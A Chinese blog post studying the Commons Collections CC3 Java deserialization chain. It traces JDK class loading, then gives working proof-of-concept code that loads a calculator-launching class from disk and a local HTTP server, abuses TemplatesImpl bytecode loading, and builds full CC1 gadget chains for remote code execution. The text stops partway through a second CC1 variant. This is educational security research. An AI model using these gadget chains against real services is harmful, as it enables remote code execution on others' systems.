---
title: "cc3链学习"
date: "2026-11-01 21:30:07"
updated: "2026-11-02 17:51:46"
permalink: "2026/11/01/cc3-classloading/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC3"]
description: "CC3 链学习：从类加载与 TemplatesImpl 字节码加载，到 TrAXFilter、InstantiateTransformer，以及拼接 CC1/CC6 前半链的实验记录。"
excerpt: "CC3 链学习：从类加载与 TemplatesImpl 字节码加载，到 TrAXFilter、InstantiateTransformer，以及拼接 CC1/CC6 前半链的实验记录。"
obsidian_source: "cc3链学习.md"
---

## CC3 学习前的准备

cc3链和之前就完全不同了，在正式开始学习cc3之前你首先要搞明白类加载的过程，我看了一个视频简直像听天书一样，还是要自己跟进去看一下，接下来我们深入代码研究一下底层类加载的过程

```java
//        获取当前使用的类加载器  
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  
//        加载类并获取返回的Class对象  
        Class<?> aClass = systemClassLoader.loadClass("TestClass");  
//        实例化  
        aClass.newInstance();
```

## 断点追踪类加载过程

我们在加载类这一行设置断点强制步入进入jdk的内部观察原理
首先来到了Classloader类的loadclass方法
我们事先已经知道我们获取当前使用的类加载器应该是launcher里面的appclassloader，但是我们为什么首先进入了classloader呢，因为app里面loadclass要求传入两个参数我们只传入了一个所以首先进入他的父类返回两个参数之后在传给他
```java
public Class<?> loadClass(String name) throws ClassNotFoundException {  
    return loadClass(name, false);  
}
```
接着步入进入了launcher里面的loadclass
```java
public Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    int i = name.lastIndexOf('.');  
    if (i != -1) {  
        SecurityManager sm = System.getSecurityManager();  
        if (sm != null) {  
            sm.checkPackageAccess(name.substring(0, i));  
        }  
    }  
  
    if (ucp.knownToNotExist(name)) {  
        // The class of the given name is not found in the parent  
        // class loader as well as its local URLClassPath.        // Check if this class has already been defined dynamically;        // if so, return the loaded class; otherwise, skip the parent        // delegation and findClass.        Class<?> c = findLoadedClass(name);  
        if (c != null) {  
            if (resolve) {  
                resolveClass(c);  
            }  
            return c;  
        }  
        throw new ClassNotFoundException(name);  
    }  
  
    return (super.loadClass(name, resolve));  
}
```
knownToNotExist这个方法会对获取到的类名进行一个缓存检查看是否有缓存且可以被使用，具体代码在URLclasspath里面
```java
synchronized boolean knownToNotExist(String name) {
    return this.lookupCacheURLs != null && lookupCacheEnabled
        ? knownToNotExist0(this.lookupCacheLoader, name)
        : false;
}
```
如果这个类没有缓存或者缓存不可用则返回flase接着进行查询操作

接着运行到return (super.loadClass(name, resolve)); ，我们发现他会把内容重新交给他的父类，这也是我们看到他在转圈的原因

在进行一些安全检查之后我们发现他有调用了父类的loadclass
又回到了classloader里面，怎么在转圈啊

```java
protected Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    synchronized (getClassLoadingLock(name)) {  
        // First, check if the class has already been loaded  
        Class<?> c = findLoadedClass(name);  
        if (c == null) {  
            long t0 = System.nanoTime();  
            try {  
                if (parent != null) {  
                    c = parent.loadClass(name, false);  
                } else {  
                    c = findBootstrapClassOrNull(name);  
                }  
            } catch (ClassNotFoundException e) {  
                // ClassNotFoundException thrown if class not found  
                // from the non-null parent class loader            }  
  
            if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
  
                // this is the defining class loader; record the stats  
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);  
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);  
                sun.misc.PerfCounter.getFindClasses().increment();  
            }  
        }  
        if (resolve) {  
            resolveClass(c);  
        }  
        return c;  
    }  
}
```
```java
protected Object getClassLoadingLock(String className) {  
    Object lock = this;  
    if (parallelLockMap != null) {  
        Object newLock = new Object();  
        lock = parallelLockMap.putIfAbsent(className, newLock);  
        if (lock == null) {  
            lock = newLock;  
        }  
    }  
    return lock;  
}
```
首先进入这个方法中，我们看注释可以知道这个方法是检查这个类是否被加载过
这段代码是获取加载某个类的时候使用的锁对象，暂时先不了解这个
跳过接着进行代码
然后进入findloadclass
```java
protected final Class<?> findLoadedClass(String name) {  
    if (!checkName(name))  
        return null;  
    return findLoadedClass0(name);  
}
```
很明显从字面上看进行名称的检查，进入checkname的方法
```java
private boolean checkName(String name) {  
    if ((name == null) || (name.length() == 0))  
        return true;  
    if ((name.indexOf('/') != -1)  
        || (!VM.allowArraySyntax() && (name.charAt(0) == '[')))  
        return false;  
    return true;  
}
```
就当学习java了，name为空可以返回true，带/不支持数组语法的时候不允许[]，然后检查完成
这个类没有被加载过所以返回null，继续委派查询
```java
protected Class<?> loadClass(String name, boolean resolve)  
    throws ClassNotFoundException  
{  
    synchronized (getClassLoadingLock(name)) {  
        // First, check if the class has already been loaded  
        Class<?> c = findLoadedClass(name);  
        if (c == null) {  
            long t0 = System.nanoTime();  
            try {  
                if (parent != null) {  
                    c = parent.loadClass(name, false);  
                } else {  
                    c = findBootstrapClassOrNull(name);  
                }  
            } catch (ClassNotFoundException e) {  
                // ClassNotFoundException thrown if class not found  
                // from the non-null parent class loader            }  
  
            if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
  
                // this is the defining class loader; record the stats  
                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);  
                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);  
                sun.misc.PerfCounter.getFindClasses().increment();  
            }  
        }  
        if (resolve) {  
            resolveClass(c);  
        }  
        return c;  
    }  
}
```

## 委派与 findClass

这里是关键代码再贴出来一遍方便查看
我们现在就开始进入双亲委派的流程了，不过不应该叫双亲委派应该叫单亲委派，自己没加载就请求要父加载器加载
按照双亲委派的流程我们这个例子应该是由应用加载器交给扩展类加载器，扩展类加载器交给启动类加载器
接着我们看代码，c为null，然后由parent执行loadclass，我们发下他执行是按照一样的代码又走了一遍，虽然代码一样但实际执行查找的位置是不一样的
然后进入启动类加载器，当然啦最终还是没有找到代码接着往下走
```java
if (c == null) {  
                // If still not found, then invoke findClass in order  
                // to find the class.                long t1 = System.nanoTime();  
                c = findClass(name);  
                
```
从这个代码里我们进入了urlclassloader
为什么会进入这个类呢？
我们知道appclassloader和extclassloader都是launcher这个类里面的内部静态类，我们可以很明显的看到这个静态类是直接继承自urlclassloader的
```java
static class AppClassLoader extends URLClassLoader {
```
因为这里面没有重写findclass这个方法，所以去到了他的父类
```java
protected Class<?> findClass(final String name)  
    throws ClassNotFoundException  
{  
    final Class<?> result;  
    try {  
        result = AccessController.doPrivileged(  
            new PrivilegedExceptionAction<Class<?>>() {  
                public Class<?> run() throws ClassNotFoundException {  
                    String path = name.replace('.', '/').concat(".class");  
                    Resource res = ucp.getResource(path, false);  
                    if (res != null) {  
                        try {  
                            return defineClass(name, res);  
                        } catch (IOException e) {  
                            throw new ClassNotFoundException(name, e);  
                        }  
                    } else {  
                        return null;  
                    }  
                }  
            }, acc);  
    } catch (java.security.PrivilegedActionException pae) {  
        throw (ClassNotFoundException) pae.getException();  
    }  
    if (result == null) {  
        throw new ClassNotFoundException(name);  
    }  
    return result;  
}
```
这段代码的寻找方式是把点换成/再后面加上class，去寻找这个文件，存在就读取字节码进行定义，找不到就抛出错误
```java
public Resource getResource(String name, boolean check) {
    Loader loader;
    int[] cache = getLookupCache(name);

    for (int i = 0;
         (loader = getNextLoader(cache, i)) != null;
         i++) {

        Resource res = loader.getResource(name, check);

        if (res != null) {
            return res;
        }
    }

    return null;
}
```
找到则返回找不到返回null
但是我们发现返回的结果是null，为什么找不到呢，因为我们现在的加载器是扩展类加载器
应该是到应用类加载器的时候才可以找到
然后到应用类加载器的时候进入defineclass里面
```java
private Class<?> defineClass(String name, Resource res) throws IOException {  
    long t0 = System.nanoTime();  
    int i = name.lastIndexOf('.');  
    URL url = res.getCodeSourceURL();  
    if (i != -1) {  
        String pkgname = name.substring(0, i);  
        // Check if package already loaded.  
        Manifest man = res.getManifest();  
        definePackageInternal(pkgname, man, url);  
    }  
    // Now read the class bytes and define the class  
    java.nio.ByteBuffer bb = res.getByteBuffer();  
    if (bb != null) {  
        // Use (direct) ByteBuffer:  
        CodeSigner[] signers = res.getCodeSigners();  
        CodeSource cs = new CodeSource(url, signers);  
        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);  
        return defineClass(name, bb, cs);  
    } else {  
        byte[] b = res.getBytes();  
        // must read certificates AFTER reading bytes.  
        CodeSigner[] signers = res.getCodeSigners();  
        CodeSource cs = new CodeSource(url, signers);  
        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);  
        return defineClass(name, b, 0, b.length, cs);  
    }  
}
```
我们可以看到最后是返回一个defineclass
然后我们发现进入了secureclassloader
```java
    return defineClass(name, b, off, len, getProtectionDomain(cs));  
}
```
依旧是返回defineclass，参数不同
又进入了他的父类classloader
```java
protected final Class<?> defineClass(String name, byte[] b, int off, int len,  
                                     ProtectionDomain protectionDomain)  
    throws ClassFormatError  
{  
    protectionDomain = preDefineClass(name, protectionDomain);  
    String source = defineClassSourceLocation(protectionDomain);  
    Class<?> c = defineClass1(name, b, off, len, protectionDomain, source);  
    postDefineClass(c, protectionDomain);  
    return c;  
}
```
```java
private native Class<?> defineClass0(String name, byte[] b, int off, int len,  
                                     ProtectionDomain pd);  
  
private native Class<?> defineClass1(String name, byte[] b, int off, int len,  
                                     ProtectionDomain pd, String source);  
  
private native Class<?> defineClass2(String name, java.nio.ByteBuffer b,  
                                     int off, int len, ProtectionDomain pd,  
                                     String source);
```
这些就是加载类的具体代码
然后就是把结果不断返回，类加载终于结束了

## 本地和远程加载实验

我们理解清楚之后就可以尝试远程加载class文件了，这才是我们想干的事情，我们是勾八黑客

接下来尝试加载恶意类，先编写一个恶意类编译之后放在c盘的src的文件夹中
```java
package src;  
  
import java.io.IOException;  
  
// URLClassLoader 的 file 协议  
public class Calc {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
 } catch (IOException e){  
            e.printStackTrace();  
 }  
    }  
}
```
然后在本项目中尝试加载它
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("file:///C:/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
显然成功了要是不成功我就不把代码放在上面了
接下来是远程加载恶意类
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:1233/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
成功弹出计算器
使用jar
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("jar:file:///C:/src/Calc.jar!/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```
http+jar
```java
import java.net.URL;  
import java.net.URLClassLoader;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        URLClassLoader dife = new URLClassLoader(new URL[]{new URL("jar:http://127.0.0.1:1233/Calc.jar!/")});  
        Class<?> aClass = dife.loadClass("src.Calc");  
        aClass.newInstance();  
    }  
}
```

## 梳理 loadClass、findClass 与 defineClass

现在我们重新梳理一下这里涉及到的三个关键方法
loadclass：从已经加载的类里面去寻找
findclass：按照URL指定的方式去寻找
defineclass：处理前面传递回来的字节码加载类
接下来我们尝试直接调用defineclass来直接加载我们的恶意类
```java
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
//        由于defineclass是一个受保护的方法，因此我们只能通过反射调用，所以我们获取加载器来获取Class来反射调用  
        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();  
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);  
        defineClass.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("C://src/Calc.class"));  
        Class calcclass = (Class) defineClass.invoke(systemClassLoader, "src.Calc", bytes, 0, bytes.length);  
        calcclass.newInstance();  
    }  
}

```

## TemplatesImpl 与字节码加载

接下来我们尝试用### TemplatesImpl来加载字节码，这是我们学习cc3的关键
我们先进入这个类欣赏一下代码
```java
static final class TransletClassLoader extends ClassLoader {  
    private final Map<String,Class> _loadedExternalExtensionFunctions;  
  
     TransletClassLoader(ClassLoader parent) {  
         super(parent);  
        _loadedExternalExtensionFunctions = null;  
    }  
  
    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {  
        super(parent);  
        _loadedExternalExtensionFunctions = mapEF;  
    }  
  
    public Class<?> loadClass(String name) throws ClassNotFoundException {  
        Class<?> ret = null;  
        // The _loadedExternalExtensionFunctions will be empty when the  
        // SecurityManager is not set and the FSP is turned off        if (_loadedExternalExtensionFunctions != null) {  
            ret = _loadedExternalExtensionFunctions.get(name);  
        }  
        if (ret == null) {  
            ret = super.loadClass(name);  
        }  
        return ret;  
     }  
  
    /**  
     * Access to final protected superclass member from outer class.     */    Class defineClass(final byte[] b) {  
        return defineClass(null, b, 0, b.length);  
    }  
}

```
我们可以看到，这里面有一个内部静态类，这个类继承了classloader
并且重写了defineclass方法
这里defineclass应该是default的属性，这种情况下在同一个包中可以调用它，我们不能直接调用我们还是要找谁调用了它，结果发现在同一个包里面的defineTransletClasses方法调用了它
```java
private void defineTransletClasses()  
    throws TransformerConfigurationException {  
  
    if (_bytecodes == null) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);  
        throw new TransformerConfigurationException(err.toString());  
    }  
  
    TransletClassLoader loader = (TransletClassLoader)  
        AccessController.doPrivileged(new PrivilegedAction() {  
            public Object run() {  
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());  
            }  
        });  
  
    try {  
        final int classCount = _bytecodes.length;  
        _class = new Class[classCount];  
  
        if (classCount > 1) {  
            _auxClasses = new HashMap<>();  
        }  
  
        for (int i = 0; i < classCount; i++) {  
            _class[i] = loader.defineClass(_bytecodes[i]);  
            final Class superClass = _class[i].getSuperclass();  
  
            // Check if this is the main class  
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
                _transletIndex = i;  
            }  
            else {  
                _auxClasses.put(_class[i].getName(), _class[i]);  
            }  
        }  
  
        if (_transletIndex < 0) {  
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  
            throw new TransformerConfigurationException(err.toString());  
        }  
    }  
    catch (ClassFormatError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
    catch (LinkageError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
我们可以看到这是一个私有方法还是不能直接调用，接着找
接下来我们找到了三处调用这个方法的
```java
private synchronized Class[] getTransletClasses() {  
    try {  
        if (_class == null) defineTransletClasses();  
    }  
    catch (TransformerConfigurationException e) {  
        // Falls through  
    }  
    return _class;  
}
```
```java
public synchronized int getTransletIndex() {  
    try {  
        if (_class == null) defineTransletClasses();  
    }  
    catch (TransformerConfigurationException e) {  
        // Falls through  
    }  
    return _transletIndex;  
}
```
```java
private Translet getTransletInstance()  
    throws TransformerConfigurationException {  
    try {  
        if (_name == null) return null;  
  
        if (_class == null) defineTransletClasses();  
  
        // The translet needs to keep a reference to all its auxiliary  
        // class to prevent the GC from collecting them        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  
        translet.postInitialization();  
        translet.setTemplates(this);  
        translet.setServicesMechnism(_useServicesMechanism);  
        translet.setAllowedProtocols(_accessExternalStylesheet);  
        if (_auxClasses != null) {  
            translet.setAuxiliaryClasses(_auxClasses);  
        }  
  
        return translet;  
    }  
    catch (InstantiationException e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
    catch (IllegalAccessException e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
第二个是public但是对我们来说他的返回值没什么用，我们发现第三处调用他紧接着就进行了实例化，这是我们想要的，我们接着找这个方法
```java
public synchronized Transformer newTransformer()  
    throws TransformerConfigurationException  
{  
    TransformerImpl transformer;  
  
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  
        _indentNumber, _tfactory);  
  
    if (_uriResolver != null) {  
        transformer.setURIResolver(_uriResolver);  
    }  
  
    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {  
        transformer.setSecureProcessing(true);  
    }  
    return transformer;  
}
```
我们找到我们想要的public方法了

## 编写 TemplatesImpl 实验

接着就要开始尝试编写exp进行利用了
首先编写一个简单的恶意类编译之后放在其他目录下
```java
import java.io.IOException;  
  
public class nihao {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
}
```
因为TemplatesImpl的有参构造方法都是protected，所以我们只能通过无参构造方法进行实例化然后再通过反射添加参数
在此之前我们还要看我们要添加什么参数
```java
public synchronized Transformer newTransformer()  
    throws TransformerConfigurationException  
{  
    TransformerImpl transformer;  
  
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  
        _indentNumber, _tfactory);  
  
    if (_uriResolver != null) {  
        transformer.setURIResolver(_uriResolver);  
    }  
  
    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {  
        transformer.setSecureProcessing(true);  
    }  
    return transformer;  
}
```
审计代码，不对这段代码好像没什么用，只要进入了这段代码直接就调用了getTransletInstance()，所以我们要看它的代码，let‘s goooooo
```java
private Translet getTransletInstance()  
    throws TransformerConfigurationException {  
    try {  
        if (_name == null) return null;  
  
        if (_class == null) defineTransletClasses();  
  
        // The translet needs to keep a reference to all its auxiliary  
        // class to prevent the GC from collecting them        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();  
        translet.postInitialization();  
        translet.setTemplates(this);  
        translet.setServicesMechnism(_useServicesMechanism);  
        translet.setAllowedProtocols(_accessExternalStylesheet);  
        if (_auxClasses != null) {  
            translet.setAuxiliaryClasses(_auxClasses);  
        }  
  
        return translet;  
    }  
    catch (InstantiationException e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
    catch (IllegalAccessException e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
欣赏这段代码，首先保证name不为空否则不接着往下执行
然后clss要为空这样才会执行我们需要执行的内容
接着看其他的代码
```java
private void defineTransletClasses()  
    throws TransformerConfigurationException {  
  
    if (_bytecodes == null) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);  
        throw new TransformerConfigurationException(err.toString());  
    }  
  
    TransletClassLoader loader = (TransletClassLoader)  
        AccessController.doPrivileged(new PrivilegedAction() {  
            public Object run() {  
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());  
            }  
        });  
  
    try {  
        final int classCount = _bytecodes.length;  
        _class = new Class[classCount];  
  
        if (classCount > 1) {  
            _auxClasses = new HashMap<>();  
        }  
  
        for (int i = 0; i < classCount; i++) {  
            _class[i] = loader.defineClass(_bytecodes[i]);  
            final Class superClass = _class[i].getSuperclass();  
  
            // Check if this is the main class  
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
                _transletIndex = i;  
            }  
            else {  
                _auxClasses.put(_class[i].getName(), _class[i]);  
            }  
        }  
  
        if (_transletIndex < 0) {  
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  
            throw new TransformerConfigurationException(err.toString());  
        }  
    }  
    catch (ClassFormatError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
    catch (LinkageError e) {  
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
bytecodes是我们需要传递的恶意字节码不能为空
这也太麻烦了我们直接开搞，有问题再说

```java
private byte[][] _bytecodes = null;
```

我们看的时候发信啊这个字段是tm一个二维字节数组，我们之前直接读class文件是一维字节数组，所以要先这样再那样，代码里会有的
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
        templates.newTransformer();  
    }  
}
```

## 报错排查与字段修正

上面是第一版的exp，果不其然出现了报错，然后根据报错去修复
```text
Exception in thread "main" java.lang.NullPointerException
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$1.run(TemplatesImpl.java:401)
	at java.security.AccessController.doPrivileged(Native Method)
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:399)
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:451)
	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)
	at filerce.main(filerce.java:23)
```
```java
return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
```
首先报错在这一行主要问题就在

```java
private transient TransformerFactoryImpl _tfactory = null;
```

这个参数在序列化的时候又不保存，我们看readobject里面怎么设置他的我们就给他赋什么值就可以了
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import javax.xml.transform.TransformerFactory;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
        templates.newTransformer();  
    }  
}
```
修改之后还是报错，接着修改
```java
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
            _transletIndex = i;  
        }  
        else {  
            _auxClasses.put(_class[i].getName(), _class[i]);  
        }  
    }  
  
    if (_transletIndex < 0) {  
        ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);  
        throw new TransformerConfigurationException(err.toString());  
    }  
}
```
问题发生在这里
现在transletIndex的值是-1即使运转到下面还是会抛出错误，所以我们尝试直接让这个equals成立
小问一下ai，这里是在判断当前类的直接父类是不是abs那个东西
所以我们要让我们的类继承这个我们修改我们的恶意类然后重新编译一下，终于可以弹计算器了
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;  
import com.sun.org.apache.xalan.internal.xsltc.TransletException;  
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  
  
import java.io.IOException;  
  
public class nihao extends AbstractTranslet {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
  
import javax.xml.transform.TransformerFactory;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.net.URL;  
import java.net.URLClassLoader;  
import java.nio.file.Files;  
import java.nio.file.Path;  
import java.nio.file.Paths;  
  
public class filerce {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> aClass = templates.getClass();  
        Field name = aClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = aClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = aClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
        templates.newTransformer();  
    }  
}
```

## 使用 TemplatesImpl 改造 CC1 与 CC6

接下来我们使用这个方法重新修改我们之前编写的两个链
cc1的两种利用方式
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc1 {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> bClass = templates.getClass();  
        Field name = bClass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"nihao");  
        byte[] bytes = Files.readAllBytes(Paths.get("C://nihao.class"));  
  
        Field bytecodes = bClass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        bytecodes.set(templates,new byte[][]{bytes});  
  
        Field tfactory = bClass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates, new TransformerFactoryImpl() );  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(templates),  
                new InvokerTransformer("newTransformer",null,null)  
        };  
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();  
  
        Transformer chain = new ChainedTransformer(transformers);  
        Map decorate = LazyMap.decorate(oObjectHashMap, chain);  
  
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);  
        declaredConstructor.setAccessible(true);  
  
        // 内层 handler：memberValues = LazyMap  
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);  
  
        // 代理对象：handler 作为 InvocationHandler        Map proxyInstance = (Map) Proxy.newProxyInstance(  
                Map.class.getClassLoader(),  
                new Class[]{Map.class},  
                handler  
        );  
  
        // 外层 handler：memberValues = proxyInstance，作为反序列化入口  
        InvocationHandler hander1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyInstance);  
  
        // ===== 序列化 =====        ByteArrayOutputStream barr = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(barr);  
        oos.writeObject(hander1);  
        oos.close();  
  
        System.out.println("序列化完成，字节数: " + barr.size());  
  
        // ===== 反序列化（触发） =====        System.out.println("开始反序列化...");  
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));  
        ois.readObject();  
        ois.close();  
    }  
}
```
```java
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
